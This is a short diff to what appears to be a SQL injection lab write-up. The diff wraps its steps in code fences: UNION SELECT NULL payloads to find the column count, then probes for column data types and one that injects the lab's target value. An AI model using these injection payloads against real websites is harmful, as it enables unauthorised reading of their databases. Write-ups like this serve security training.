@@ -11,14 +11,20 @@ The lab will provide a random value that you need to make appear within the quer
 
 1/ Determine the number of columns
 
+```sql
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
+```
 
 
 2/ Determine the data type of columns
 
+```sql
 ' UNION SELECT 111, 'AAA', 111--
+```
 
+```sql
 ' UNION SELECT NULL, '1GLMfU', NULL--
+```
 
